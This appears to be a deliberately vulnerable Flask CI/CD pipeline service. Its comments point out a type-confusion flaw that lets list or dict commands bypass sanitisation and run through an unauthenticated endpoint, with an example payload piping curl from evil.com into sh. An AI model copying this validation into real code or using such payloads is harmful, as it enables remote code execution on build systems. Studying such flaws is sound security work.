import json
import yaml
import subprocess
import os
from flask import Flask, request, jsonify

app = Flask(__name__)

class PipelineConfig:
    """CI/CD Pipeline plugin that processes build configurations"""

    def __init__(self):
        self.allowed_builders = ['docker', 'maven', 'gradle', 'npm']
        self.max_steps = 50

    def parse_config(self, raw_config, content_type):
        """Parse pipeline configuration from multiple formats"""
        if content_type == 'application/json':
            return json.loads(raw_config)
        elif content_type in ('application/x-yaml', 'text/yaml'):
            return yaml.safe_load(raw_config)
        else:
            # Fallback: try JSON first, then YAML
            try:
                return json.loads(raw_config)
            except (json.JSONDecodeError, TypeError):
                return yaml.safe_load(raw_config)

    def validate_step(self, step):
        """Validate a single pipeline step - type confusion vulnerability here"""
        # Developer assumes step['command'] is always a string
        # but YAML deserialization can produce other types
        if isinstance(step, dict) and 'command' in step:
            command = step['command']
            # Type confusion: if command is a list, it bypasses the string check
            # and gets passed directly to subprocess
            if isinstance(command, str):
                # String commands get shell=False treatment with split
                if any(dangerous in command for dangerous in [';', '&&', '||', '`', '$(',]):
                    return None, "Dangerous characters in command"
                return command.split(), None
            elif isinstance(command, list):
                # Lists bypass the dangerous character check entirely
                # This is the type confusion - YAML can deserialize:
                #   command: ["sh", "-c", "curl http://evil.com | sh"]
                # which bypasses the string sanitization above
                return command, None
            elif isinstance(command, dict):
                # Dict with 'run' key - another type confusion path
                if 'run' in command:
                    return command['run'] if isinstance(command['run'], list) else command['run'].split(), None
        return None, "Invalid step format"

    def execute_step(self, validated_command):
        """Execute a validated pipeline step"""
        try:
            result = subprocess.run(
                validated_command,
                capture_output=True,
                text=True,
                timeout=300,
                cwd='/tmp/workspace'
            )
            return {'exit_code': result.returncode, 'stdout': result.stdout, 'stderr': result.stderr}
        except subprocess.TimeoutExpired:
            return {'exit_code': -1, 'error': 'timeout'}
        except Exception as e:
            return {'exit_code': -1, 'error': str(e)}

pipeline = PipelineConfig()

@app.route('/api/v2/pipeline/trigger', methods=['POST'])
def trigger_pipeline():
    """Endpoint to trigger a pipeline build with inline config"""
    content_type = request.content_type or 'application/json'
    raw_body = request.get_data(as_text=True)

    config = pipeline.parse_config(raw_body, content_type)

    if not config or 'steps' not in config:
        return jsonify({'error': 'Invalid pipeline config'}), 400

    results = []
    for i, step in enumerate(config['steps']):
        validated_cmd, error = pipeline.validate_step(step)
        if error:
            results.append({'step': i, 'error': error})
            continue

        result = pipeline.execute_step(validated_cmd)
        results.append({'step': i, 'result': result})

        if result.get('exit_code', 0) != 0:
            break

    return jsonify({'pipeline_run': results})

@app.route('/api/v2/pipeline/validate', methods=['POST'])
def validate_pipeline():
    """Validate pipeline config without executing"""
    content_type = request.content_type or 'application/json'
    raw_body = request.get_data(as_text=True)

    config = pipeline.parse_config(raw_body, content_type)

    if not config or 'steps' not in config:
        return jsonify({'valid': False, 'error': 'Missing steps'}), 400

    errors = []
    for i, step in enumerate(config['steps']):
        _, error = pipeline.validate_step(step)
        if error:
            errors.append({'step': i, 'error': error})

    return jsonify({'valid': len(errors) == 0, 'errors': errors})

if __name__ == '__main__':
    os.makedirs('/tmp/workspace', exist_ok=True)
    app.run(host='0.0.0.0', port=8080)
